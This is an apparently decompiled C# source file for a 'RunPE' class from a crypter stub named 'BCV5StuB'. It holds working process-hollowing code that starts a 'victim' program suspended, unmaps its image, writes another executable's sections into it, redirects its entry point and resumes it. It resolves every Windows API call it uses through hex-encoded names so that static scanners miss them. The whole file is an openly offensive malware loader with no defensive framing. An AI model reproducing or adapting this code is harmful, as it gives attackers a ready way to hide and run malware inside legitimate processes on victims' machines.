using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BCV5StuB;

public sealed class RunPE : NativeDllCalls
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public int lpReserved2;

		public int hStdInput;

		public int hStdOutput;

		public int hStdError;
	}

	private struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	private struct IMAGE_DOS_HEADER
	{
		public ushort e_magic;

		public ushort e_cblp;

		public ushort e_cp;

		public ushort e_crlc;

		public ushort e_cparhdr;

		public ushort e_minalloc;

		public ushort e_maxalloc;

		public ushort e_ss;

		public ushort e_sp;

		public ushort e_csum;

		public ushort e_ip;

		public ushort e_cs;

		public ushort e_lfarlc;

		public ushort e_ovno;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] e_res1;

		public ushort e_oemid;

		public ushort e_oeminfo;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] e_res2;

		public int e_lfanew;
	}

	private struct SECURITY_ATTRIBUTES
	{
		public int nLength;

		public IntPtr lpSecurityDescriptor;

		public int bInheritHandle;
	}

	private struct FLOATING_SAVE_AREA
	{
		public uint ControlWord;

		public uint StatusWord;

		public uint TagWord;

		public uint ErrorOffset;

		public uint ErrorSelector;

		public uint DataOffset;

		public uint DataSelector;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] RegisterArea;

		public uint Cr0NpxState;
	}

	private struct CONTEXT
	{
		public uint ContextFlags;

		public uint Dr0;

		public uint Dr1;

		public uint Dr2;

		public uint Dr3;

		public uint Dr6;

		public uint Dr7;

		public FLOATING_SAVE_AREA FloatSave;

		public uint SegGs;

		public uint SegFs;

		public uint SegEs;

		public uint SegDs;

		public uint Edi;

		public uint Esi;

		public uint Ebx;

		public uint Edx;

		public uint Ecx;

		public uint Eax;

		public uint Ebp;

		public uint Eip;

		public uint SegCs;

		public uint EFlags;

		public uint Esp;

		public uint SegSs;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] ExtendedRegisters;
	}

	private struct IMAGE_OPTIONAL_HEADER32
	{
		public ushort Magic;

		public byte MajorLinkerVersion;

		public byte MinorLinkerVersion;

		public uint SizeOfCode;

		public uint SizeOfInitializedData;

		public uint SizeOfUninitializedData;

		public uint AddressOfEntryPoint;

		public uint BaseOfCode;

		public uint BaseOfData;

		public uint ImageBase;

		public uint SectionAlignment;

		public uint FileAlignment;

		public ushort MajorOperatingSystemVersion;

		public ushort MinorOperatingSystemVersion;

		public ushort MajorImageVersion;

		public ushort MinorImageVersion;

		public ushort MajorSubsystemVersion;

		public ushort MinorSubsystemVersion;

		public uint Win32VersionValue;

		public uint SizeOfImage;

		public uint SizeOfHeaders;

		public uint CheckSum;

		public ushort Subsystem;

		public ushort DllCharacteristics;

		public uint SizeOfStackReserve;

		public uint SizeOfStackCommit;

		public uint SizeOfHeapReserve;

		public uint SizeOfHeapCommit;

		public uint LoaderFlags;

		public uint NumberOfRvaAndSizes;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public IMAGE_DATA_DIRECTORY[] DataDirectory;
	}

	private struct IMAGE_FILE_HEADER
	{
		public ushort Machine;

		public ushort NumberOfSections;

		public uint TimeDateStamp;

		public uint PointerToSymbolTable;

		public uint NumberOfSymbols;

		public ushort SizeOfOptionalHeader;

		public ushort Characteristics;
	}

	private struct IMAGE_DATA_DIRECTORY
	{
		public uint VirtualAddress;

		public uint Size;
	}

	private struct IMAGE_NT_HEADERS
	{
		public uint Signature;

		public IMAGE_FILE_HEADER FileHeader;

		public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
	}

	private struct Misc
	{
		public uint PhysicalAddress;

		public uint VirtualSize;
	}

	private struct IMAGE_SECTION_HEADER
	{
		public byte Name;

		public Misc Misc;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint PointerToRelocations;

		public uint PointerToLinenumbers;

		public ushort NumberOfRelocations;

		public ushort NumberOfLinenumbers;

		public uint Characteristics;
	}

	private enum ImageSignatureTypes
	{
		IMAGE_DOS_SIGNATURE = 23117,
		IMAGE_OS2_SIGNATURE = 17742,
		IMAGE_OS2_SIGNATURE_LE = 17740,
		IMAGE_VXD_SIGNATURE = 17740,
		IMAGE_NT_SIGNATURE = 17744
	}

	private delegate uint ResumeThread(IntPtr hThread);

	private delegate bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

	private delegate bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

	private delegate bool CreateProcessA(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

	private delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int iSize, out int lpNumberOfBytesWritten);

	private delegate int ReadProcessMemory(IntPtr hProcess, int lpBaseAddress, ref IntPtr lpbuffer, int size, ref int lpNumberOfBytesRead);

	private delegate long ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);

	private delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	private delegate int VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UIntPtr flNewProtect, [Out] uint lpflOldProtect);

	private const int CONTEXT_X86 = 65536;

	private const int CONTEXT86_INTEGER = 65538;

	private const long MEM_COMMIT = 4096L;

	private const long MEM_RESERVE = 8192L;

	private const long PAGE_EXECUTE_READWRITE = 64L;

	private const long PAGE_EXECUTE_READ = 32L;

	private const long PAGE_EXECUTE = 16L;

	private const long PAGE_NOACCESS = 1L;

	private const long PAGE_READWRITE = 4L;

	private const uint PAGE_READONLY = 2u;

	private const string KERNEL32HEX = "0x6b65726e656c3332";

	private const string NTDLLHEX = "0x6e74646c6c";

	[DebuggerNonUserCode]
	public RunPE()
	{
	}

	private long Protect(long characteristics)
	{
		object[] array = new object[8] { 1L, 16L, 2u, 32L, 4L, 64L, 4L, 64L };
		return Conversions.ToLong(array[checked((int)RShift(characteristics, 29L))]);
	}

	private long RShift(long lValue, long lNumberOfBitsToShift)
	{
		return checked((long)Math.Round(vbLongToULong(lValue) / Math.Pow(2.0, lNumberOfBitsToShift)));
	}

	private double vbLongToULong(long Value)
	{
		if (Value < 0L)
		{
			return (double)Value + 4294967296.0;
		}
		return Value;
	}

	public bool SRexec(string sExePath, string sVictim)
	{
		if (File.Exists(sExePath))
		{
			byte[] b = File.ReadAllBytes(sExePath);
			return SRexec(b, sVictim);
		}
		bool result = default(bool);
		return result;
	}

	public bool SRexec(byte[] b, string sVictim)
	{
		IMAGE_DOS_HEADER iMAGE_DOS_HEADER = default(IMAGE_DOS_HEADER);
		CONTEXT lpContext = default(CONTEXT);
		IMAGE_NT_HEADERS iMAGE_NT_HEADERS = default(IMAGE_NT_HEADERS);
		IMAGE_SECTION_HEADER iMAGE_SECTION_HEADER = default(IMAGE_SECTION_HEADER);
		PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
		STARTUPINFO lpStartupInfo = default(STARTUPINFO);
		SECURITY_ATTRIBUTES lpProcessAttributes = default(SECURITY_ATTRIBUTES);
		SECURITY_ATTRIBUTES lpThreadAttributes = default(SECURITY_ATTRIBUTES);
		GCHandle gCHandle = GCHandle.Alloc(b, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), iMAGE_DOS_HEADER.GetType());
		IMAGE_DOS_HEADER iMAGE_DOS_HEADER2 = default(IMAGE_DOS_HEADER);
		iMAGE_DOS_HEADER = ((obj != null) ? ((IMAGE_DOS_HEADER)obj) : iMAGE_DOS_HEADER2);
		gCHandle.Free();
		CreateProcessA createProcessA = (CreateProcessA)DynamicCall("0x6b65726e656c3332", "0x43726561746550726f6365737341", typeof(CreateProcessA));
		IntPtr lpEnvironment = default(IntPtr);
		if (!createProcessA(null, sVictim, ref lpProcessAttributes, ref lpThreadAttributes, bInheritHandles: false, 4u, lpEnvironment, null, ref lpStartupInfo, out lpProcessInformation))
		{
			return false;
		}
		int value = checked(num + iMAGE_DOS_HEADER.e_lfanew);
		IntPtr ptr = new IntPtr(value);
		object? obj2 = Marshal.PtrToStructure(ptr, iMAGE_NT_HEADERS.GetType());
		IMAGE_NT_HEADERS iMAGE_NT_HEADERS2 = default(IMAGE_NT_HEADERS);
		iMAGE_NT_HEADERS = ((obj2 != null) ? ((IMAGE_NT_HEADERS)obj2) : iMAGE_NT_HEADERS2);
		lpStartupInfo.cb = Strings.Len((object)lpStartupInfo);
		lpContext.ContextFlags = 65538u;
		if (((long)iMAGE_NT_HEADERS.Signature != 17744L) | (iMAGE_DOS_HEADER.e_magic != 23117))
		{
			return false;
		}
		GetThreadContext getThreadContext = (GetThreadContext)DynamicCall("0x6b65726e656c3332", "0x476574546872656164436f6e74657874", typeof(GetThreadContext));
		ReadProcessMemory readProcessMemory = (ReadProcessMemory)DynamicCall("0x6b65726e656c3332", "0x5265616450726f636573734d656d6f7279", typeof(ReadProcessMemory));
		ZwUnmapViewOfSection zwUnmapViewOfSection = (ZwUnmapViewOfSection)DynamicCall("0x6e74646c6c", "0x5a77556e6d6170566965774f6653656374696f6e", typeof(ZwUnmapViewOfSection));
		bool num2 = getThreadContext(lpProcessInformation.hThread, ref lpContext);
		IntPtr hProcess = lpProcessInformation.hProcess;
		int num4;
		long num3 = default(long);
		checked
		{
			int lpBaseAddress = (int)(unchecked((long)lpContext.Ebx) + 8L);
			ptr = (IntPtr)num3;
			int lpNumberOfBytesRead = 0;
			num4 = readProcessMemory(hProcess, lpBaseAddress, ref ptr, 4, ref lpNumberOfBytesRead);
			num3 = (long)ptr;
		}
		if ((num2 && num4 >= 0) & (zwUnmapViewOfSection(lpProcessInformation.hProcess, (IntPtr)num3) >= 0L))
		{
			VirtualAllocEx virtualAllocEx = (VirtualAllocEx)DynamicCall("0x6b65726e656c3332", "0x5669727475616c416c6c6f634578", typeof(VirtualAllocEx));
			uint num5 = checked((uint)(int)virtualAllocEx(lpProcessInformation.hProcess, (IntPtr)iMAGE_NT_HEADERS.OptionalHeader.ImageBase, iMAGE_NT_HEADERS.OptionalHeader.SizeOfImage, 12288u, 4u));
			if ((long)num5 != 0L)
			{
				WriteProcessMemory writeProcessMemory = (WriteProcessMemory)DynamicCall("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(WriteProcessMemory));
				WriteProcessMemory writeProcessMemory2 = writeProcessMemory;
				IntPtr hProcess2 = lpProcessInformation.hProcess;
				IntPtr lpBaseAddress2 = (IntPtr)num5;
				SetThreadContext setThreadContext;
				ResumeThread resumeThread;
				checked
				{
					int iSize = (int)iMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders;
					uint num6 = default(uint);
					int lpNumberOfBytesRead = (int)num6;
					writeProcessMemory2(hProcess2, lpBaseAddress2, b, iSize, out lpNumberOfBytesRead);
					num6 = (uint)lpNumberOfBytesRead;
					long num7 = iMAGE_DOS_HEADER.e_lfanew + 248;
					int num8 = unchecked((int)iMAGE_NT_HEADERS.FileHeader.NumberOfSections) - 1;
					IMAGE_SECTION_HEADER iMAGE_SECTION_HEADER2 = default(IMAGE_SECTION_HEADER);
					for (int i = 0; i <= num8; i++)
					{
						ptr = new IntPtr(num + num7 + i * 40);
						object? obj3 = Marshal.PtrToStructure(ptr, iMAGE_SECTION_HEADER.GetType());
						iMAGE_SECTION_HEADER = ((obj3 != null) ? ((IMAGE_SECTION_HEADER)obj3) : iMAGE_SECTION_HEADER2);
						byte[] array = new byte[(int)iMAGE_SECTION_HEADER.SizeOfRawData + 1];
						int num9 = (int)(unchecked((long)iMAGE_SECTION_HEADER.SizeOfRawData) - 1L);
						for (int j = 0; j <= num9; j++)
						{
							array[j] = b[(int)(unchecked((long)iMAGE_SECTION_HEADER.PointerToRawData) + unchecked((long)j))];
						}
						writeProcessMemory = (WriteProcessMemory)DynamicCall("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(WriteProcessMemory));
						VirtualProtectEx virtualProtectEx = (VirtualProtectEx)DynamicCall("0x6b65726e656c3332", "0x5669727475616c50726f746563744578", typeof(VirtualProtectEx));
						WriteProcessMemory writeProcessMemory3 = writeProcessMemory;
						IntPtr hProcess3 = lpProcessInformation.hProcess;
						IntPtr lpBaseAddress3 = (IntPtr)(num5 + iMAGE_SECTION_HEADER.VirtualAddress);
						int iSize2 = (int)iMAGE_SECTION_HEADER.SizeOfRawData;
						lpNumberOfBytesRead = (int)num6;
						writeProcessMemory3(hProcess3, lpBaseAddress3, array, iSize2, out lpNumberOfBytesRead);
						num6 = (uint)lpNumberOfBytesRead;
						virtualProtectEx(lpProcessInformation.hProcess, (IntPtr)(num5 + iMAGE_SECTION_HEADER.VirtualAddress), (UIntPtr)iMAGE_SECTION_HEADER.Misc.VirtualSize, (UIntPtr)(ulong)Protect(iMAGE_SECTION_HEADER.Characteristics), (uint)num3);
					}
					byte[] bytes = BitConverter.GetBytes(num5);
					writeProcessMemory = (WriteProcessMemory)DynamicCall("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(WriteProcessMemory));
					WriteProcessMemory writeProcessMemory4 = writeProcessMemory;
					IntPtr hProcess4 = lpProcessInformation.hProcess;
					IntPtr lpBaseAddress4 = (IntPtr)(unchecked((long)lpContext.Ebx) + 8L);
					lpNumberOfBytesRead = (int)num6;
					writeProcessMemory4(hProcess4, lpBaseAddress4, bytes, 4, out lpNumberOfBytesRead);
					num6 = (uint)lpNumberOfBytesRead;
					lpContext.Eax = num5 + iMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint;
					setThreadContext = (SetThreadContext)DynamicCall("0x6b65726e656c3332", "0x536574546872656164436f6e74657874", typeof(SetThreadContext));
					resumeThread = (ResumeThread)DynamicCall("0x6b65726e656c3332", "0x526573756d65546872656164", typeof(ResumeThread));
				}
				if (setThreadContext(lpProcessInformation.hThread, ref lpContext))
				{
					return (long)resumeThread(lpProcessInformation.hThread) > 0L;
				}
				bool result = default(bool);
				return result;
			}
			return false;
		}
		return false;
	}
}
